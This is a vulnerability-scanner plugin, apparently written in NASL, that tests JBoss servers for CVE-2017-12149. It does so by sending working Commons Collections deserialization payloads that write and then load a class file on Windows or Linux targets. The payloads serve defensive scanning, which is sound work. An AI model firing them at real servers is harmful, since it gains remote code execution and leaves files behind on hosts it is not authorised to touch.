############################################################
# Author: yangxu
# Copyright @WebRAY  
############################################################
include("compat.inc");


if (description)
{
  script_id(51799223);
  script_version("1.3");
  script_name(english:" Red Hat Jboss Enterprise Application Platform CVE-2017-12149 Remote Code Execution Vulnerability");
  script_summary(english:" Red Hat Jboss Enterprise Application Platform CVE-2017-12149 Remote Code Execution Vulnerability");
  script_set_attribute(attribute:"description", value:"In Jboss Application Server as shipped with Red Hat Enterprise Application Platform 5.2, it was found that the doFilter method in the ReadOnlyAccessFilter of the HTTP Invoker does not restrict classes for which it performs deserialization and thus allowing an attacker to execute arbitrary code via crafted serialized data. ");
  script_set_attribute(attribute:"solution", value:"At present, manufacturers have released upgrade patches to fix vulnerabilities.https://www.redhat.com");
  script_set_attribute(attribute:"vuln_publication_date",value:"2017/07/13");
  script_set_attribute(attribute:"patch_publication_date",value:"2017/07/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/07/13");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 
  script_require_ports("Services/www", 8080);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");
include("install_func.inc");
include("dump.inc");

port = get_http_port(default:8080, embedded:FALSE);
os = get_kb_item_or_exit("Host/OS");
# Check http banner for JBoss
banner = get_http_banner(port: port);
if ("JBoss" >!< banner && "Apache-Coyote" >!< banner) audit(AUDIT_NOT_LISTEN,"JBoss",port);



soc = open_sock_tcp(port);
if (!soc)
{
  audit(AUDIT_SOCK_FAIL, port, appname);
}
pattern = "jboss_"+hexstr(rand_str(length:8))+"_vuln!";
cmdlen = strlen(pattern);

if("windows" >< tolower(os))
{
    jboss_ser = hex2raw(s:"aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200186a6176612e696f2e46696c654f757470757453747265616d000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb342020000787074000e676574436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001740024633a2f77696e646f77732f74656d702f52756e436865636b436f6e6669672e636c61737374000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e001800000001757200025b42acf317f8060854e00200007870000001ebcafebabe00000032001c07000201000e52756e436865636b436f6e6669670700040100106a6176612f6c616e672f4f626a6563740100063c696e69743e010015284c6a6176612f6c616e672f537472696e673b295601000a457863657074696f6e730700090100136a6176612f6c616e672f457863657074696f6e010004436f64650a0003000c0c0005000d01000328295608000f0100");
	jboss_ser += raw_string(cmdlen) + raw_string(pattern);
	jboss_ser += hex2raw(s:"0a000800110c0005000601000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100104c52756e436865636b436f6e6669673b010008706172616d636d640100124c6a6176612f6c616e672f537472696e673b01000e6c6f63616c457863657074696f6e0100154c6a6176612f6c616e672f457863657074696f6e3b01000a536f7572636546696c6501001352756e436865636b436f6e6669672e6a617661002100010003000000000001000100050006000200070000000400010008000a0000005200030003000000102ab7000bbb000859120eb700104d2cbf0000000200120000000a0002000000080004000900130000002000030000001000140015000000000010001600170001000e00020018001900020001001a00000002001b74000577726974657571007e001a000000017671007e002b7371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878");
	
	jboss_ser_yz = hex2raw(s:"aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e0018000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f7269747971007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f746f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400112f633a2f77696e646f77732f74656d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e00180000000174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e0018000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400016171007e002a7571007e001a0000000171007e002c737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878");
	report =
		'\nScanner was able to exploit a Windows jboss deserialization vulnerability by' +
		'\nsending a crafted Java object.' +
		'\n\nConfirm File : c:/windows/temp/RunCheckConfig.class And Del \n\n';
}
if("linux" >< tolower(os))
{
	jboss_ser = hex2raw(s:"aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200186a6176612e696f2e46696c654f757470757453747265616d000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb342020000787074000e676574436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400192f746d702f52756e436865636b436f6e6669672e636c61737374000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e001800000001757200025b42acf317f8060854e00200007870000001ebcafebabe00000032001c07000201000e52756e436865636b436f6e6669670700040100106a6176612f6c616e672f4f626a6563740100063c696e69743e010015284c6a6176612f6c616e672f537472696e673b295601000a457863657074696f6e730700090100136a6176612f6c616e672f457863657074696f6e010004436f64650a0003000c0c0005000d01000328295608000f0100");
    jboss_ser += raw_string(cmdlen) + raw_string(pattern);
	jboss_ser += hex2raw(s:"0a000800110c0005000601000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100104c52756e436865636b436f6e6669673b010008706172616d636d640100124c6a6176612f6c616e672f537472696e673b01000e6c6f63616c457863657074696f6e0100154c6a6176612f6c616e672f457863657074696f6e3b01000a536f7572636546696c6501001352756e436865636b436f6e6669672e6a617661002100010003000000000001000100050006000200070000000400010008000a0000005200030003000000102ab7000bbb000859120eb700104d2cbf0000000200120000000a0002000000080004000900130000002000030000001000140015000000000010001600170001000e00020018001900020001001a00000002001b74000577726974657571007e001a000000017671007e002b7371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878");
	
	jboss_ser_yz = hex2raw(s:"aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e0018000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f7269747971007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f746f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400052f746d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e00180000000174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e0018000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400016171007e002a7571007e001a0000000171007e002c737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878");
	report =
		'\nScanner was able to exploit a Linux jboss deserialization vulnerability by' +
		'\nsending a crafted Java object.' +
		'\n\nConfirm File : /tmp/RunCheckConfig.class And Del \n\n';
}



ssl = get_kb_list("SSL/Transport/"+port);
if(!ssl) {
	check_vuln(port:port);
} else {
	check_vuln_ssl(port:port);
}


function check_vuln(port){
	url = string('/invoker/readonly');
	req_step_1 = http_send_recv3(method: "POST", data:jboss_ser,port: port, item: url,add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
	if("500">< req_step_1[0]){
		req_step_2 = http_send_recv3(method: "POST", data:jboss_ser_yz,port: port, item: url,add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
		if ("500" >< req_step_2[0] && pattern >< req_step_2[2])
		{
			if (report_verbosity > 0) security_hole(port:port, data:report+req_step_2[2]);
			else security_hole(port);
		}
	}
}

function check_vuln_ssl(port){
	url = string('/invoker/readonly');
	req_step_1 = http_send_recv3(method: "POST", data:jboss_ser,port: port, item: url,add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
	reqs = http_last_sent_request();
	ssl_reqs = https_req_get(request:reqs, port:port);
	if ("500 Internal Server Error" >< ssl_reqs){
		req_step_2 = http_send_recv3(method: "POST", data:jboss_ser_yz,port: port, item: url,add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
		reqs_2 = http_last_sent_request();
		ssl_reqs_2 = https_req_get(request:reqs_2, port:port);
		if ("500 Internal Server Error" >< ssl_reqs_2 && pattern >< ssl_reqs_2)
		{
			if (report_verbosity > 0) security_hole(port:port, extra:report+ssl_reqs_2);
			else security_hole(port);
		}
	}
}